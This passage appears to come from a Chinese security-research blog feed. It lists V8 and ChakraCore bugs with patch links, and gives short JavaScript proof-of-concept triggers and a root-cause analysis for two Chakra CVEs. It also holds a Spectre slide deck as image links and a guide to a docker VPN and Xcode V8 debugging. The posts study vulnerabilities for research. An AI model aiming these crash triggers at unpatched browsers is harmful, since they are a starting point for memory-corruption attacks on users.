class="headerlink" title="Bugs:819311"></a>Bugs:819311</h2><ul><li>DCHECK failure in op-&gt;opcode() == IrOpcode::kStateValues || op-&gt;opcode() == IrOpcode::kTypedStateV<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=819311" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=819311</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49" target="_blank" rel="noopener">https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49</a></li><li>影响范围</li></ul><p>6.7.26及以下</p><h2 id="Bugs-820984"><a href="#Bugs-820984" class="headerlink" title="Bugs:820984"></a>Bugs:820984</h2><ul><li>CHECK failure: InstructionSelector::SupportsSpeculationPoisoning() in pipeline.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=820984" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=820984</a><br>没找到patch，好像是回滚了</li></ul><h2 id="Bug-822284"><a href="#Bug-822284" class="headerlink" title="Bug:822284"></a>Bug:822284</h2><ul><li>ThinStrings are incompatible with TurboFan SeqString types<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=822284" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=822284</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8</a></li><li>引入漏洞的分支<br><a href="https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2</a></li><li>影响版本</li></ul><p>6.5.245-6.7.86</p><h2 id="Bugs-829679"><a href="#Bugs-829679" class="headerlink" title="Bugs:829679"></a>Bugs:829679</h2><ul><li>incorrect usages of SelectTaggedConstant()<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=829679" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=829679</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2</a></li><li>影响版本</li></ul><p>6.7.245及以下</p><h1 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h1><h2 id="关注更新"><a href="#关注更新" class="headerlink" title="关注更新"></a>关注更新</h2><p><a href="https://github.com/Microsoft/ChakraCore/wiki/Roadmap" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/wiki/Roadmap</a></p><h2 id="v1-8-3"><a href="#v1-8-3" class="headerlink" title="v1.8.3"></a>v1.8.3</h2><h3 id="CVE-2018-8139"><a href="#CVE-2018-8139" class="headerlink" title="CVE-2018-8139"></a>CVE-2018-8139</h3><ul><li><p>Microsoft Edge: Chakra: A bug in BoundFunction::NewInstance<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1569" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1569</a></p></li><li><p>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76</a></p></li><li><p>PoC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">new</span>.target.x;<span class="comment">//[0]-&gt;new.target跟在正常的参数之后，.x的时候会当JS对象处理，我在还原poc的时候new.target刚好是空指针，于是就读Null.x触发crash了。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = func.bind(&#123;&#125;, <span class="number">1</span>);<span class="comment">//-&gt;boundFunction-&gt;boundArgs[i]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(bound, []);</span><br></pre></td></tr></table></figure></li><li><p>Syntax<br>Reflect.construct<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br></pre></td></tr></table></figure><p>不引入newTarget这个可选参数，就和new target(…args)用法一致<br>但是引入的话，就是为了在一些框架里满足一种罕见的需求，也就是要求<strong>用target来初始化实例，但是却要求表现出来的结果是newTarget的实例</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-072310.png" alt=""></p></li><li><p>root cause<br>漏洞成因是BoundFunction::NewInstance在调用Target函数时，没有考虑到CallFlags_ExtraArg这个flag，所以没有拷贝ExtraArg(这里也就是newTarget)。<br>从patch里可以看到，在patch之后，考虑到了这个flag。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+           <span class="keyword">if</span> (args.HasExtraArg())</span><br><span class="line">+            &#123;</span><br><span class="line">+                newValues[index++] = args.Values[argCount];</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-083423.jpg" alt=""></p></li></ul><p><strong>但仍有CallFlags_NewTarget标记</strong>。<br>导致在后面真正调用Target函数的时候，在InterpreterStackFrame::OP_LdNewTarget时，会从栈上的Args数组越界读取8个字节的内容<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093809.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093857.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093906.jpg" alt=""></p><ul><li>info leak<br>能不能布置栈上数据？</li><li>how to find?<br>对标志位的处理，逻辑bug，审计？</li></ul><h2 id="v1-8-4"><a href="#v1-8-4" class="headerlink" title="v1.8.4"></a>v1.8.4</h2><h3 id="CVE-2018-8229"><a href="#CVE-2018-8229" class="headerlink" title="CVE-2018-8229"></a>CVE-2018-8229</h3><ul><li>Microsoft Edge: Chakra: JIT: Type confusion with hoisted SetConcatStrMultiItemBE instructions<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1560" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1560</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10</a></li><li>PoC<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = str.charCodeAt(<span class="string">'AAAAAAAAAA'</span> + str + <span class="string">'BBBBBBBBBB'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt(<span class="string">'x'</span>);</span><br><span class="line">opt(<span class="number">0x1234</span>);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Chrome&quot;&gt;&lt;a href=&quot;#Chrome&quot; class=&quot;headerlink&quot; title=&quot;Chrome&quot;&gt;&lt;/a&gt;Chrome&lt;/h1&gt;&lt;h2 id=&quot;Bugs-715582&quot;&gt;&lt;a href=&quot;#Bugs-715582&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
      <category term="chrome" scheme="http://eternalsakura13.com/tags/chrome/"/>
    
      <category term="safari" scheme="http://eternalsakura13.com/tags/safari/"/>
    
  </entry>
  
  <entry>
    <title>被“幽灵”困扰的浏览器</title>
    <link href="http://eternalsakura13.com/2018/07/21/kanxue/"/>
    <id>http://eternalsakura13.com/2018/07/21/kanxue/</id>
    <published>2018-07-21T09:07:03.717Z</published>
    <updated>2018-10-22T14:25:51.743Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-091936.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092223.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092420.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092444.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092549.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092615.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092651.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092739.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092800.png" alt=""></p><h3 id="Spectre-in-Browser"><a href="#Spectre-in-Browser" class="headerlink" title="Spectre in Browser"></a>Spectre in Browser</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092827.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093134.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093251.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093319.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093354.png" alt=""></p><h3 id="Real-attack-of-“Spectre”"><a href="#Real-attack-of-“Spectre”" class="headerlink" title="Real attack of “Spectre”"></a>Real attack of “Spectre”</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093520.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093537.png" alt=""></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093627.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Spectre&quot;&gt;&lt;a href=&quot;#Spectre&quot; class=&quot;headerlink&quot; title=&quot;Spectre&quot;&gt;&lt;/a&gt;Spectre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>在mac上使用xcode调试v8</title>
    <link href="http://eternalsakura13.com/2018/07/20/v8_xcode/"/>
    <id>http://eternalsakura13.com/2018/07/20/v8_xcode/</id>
    <published>2018-07-20T08:07:44.358Z</published>
    <updated>2018-07-20T09:05:45.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。<br>然后命令行调试还是太太太麻烦了，于是在VPN搭好了之后，就在xcode上干活了。</p><h2 id="搭建VPN并连接"><a href="#搭建VPN并连接" class="headerlink" title="搭建VPN并连接"></a>搭建VPN并连接</h2><p>在之前搭ss的服务器上运行一个vpn的docker(人生苦短，我用docker)<br>直接切换到root然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    --name ipsec-vpn-server \</span><br><span class="line">    --restart&#x3D;always \</span><br><span class="line">    -e VPN_IPSEC_PSK&#x3D;你的密码 \</span><br><span class="line">    -e VPN_USER&#x3D;你的用户名 \</span><br><span class="line">    -e VPN_PASSWORD&#x3D;你的共享密码（其实和密码填一样就好了，不会弄混） \</span><br><span class="line">    -p 500:500&#x2F;udp \</span><br><span class="line">    -p 4500:4500&#x2F;udp \</span><br><span class="line">    -v &#x2F;lib&#x2F;modules:&#x2F;lib&#x2F;modules:ro \</span><br><span class="line">    -d --privileged \</span><br><span class="line">    hwdsl2&#x2F;ipsec-vpn-server</span><br></pre></td></tr></table></figure><p>连接VPN<br><a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">http://www.vpngate.net/cn/howto_l2tp.aspx</a></p><h2 id="mac上编译"><a href="#mac上编译" class="headerlink" title="mac上编译"></a>mac上编译</h2><p>怎么获取源码，终端编译之前已经写过了，懒得赘述。<br>这里讲一下怎么建立xcode工程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out&#x2F;gn --ide&#x3D;&quot;xcode&quot;</span><br></pre></td></tr></table></figure><p>这样，在out目录下就会有gn文件夹，里面有all.xcworkspace文件，可以直接使用xcode打开这个工作区文件，接下来要设置编译的目标，在Product-&gt;Scheme下选择d8，否则会编译出错，这样就只编译d8这个可执行程序，使用d8就可以直接调试v8的源代码。<br>然后直接Build，编译时间有些长，会自动生成v8的链接库，等待编译完成，在Product-&gt;EditScheme菜单中把poc文件作为运行参数，在对应文件中下好断点，直接运行就会断下来了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>噫，我好像只是教了怎么搭VPN……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
</feed>
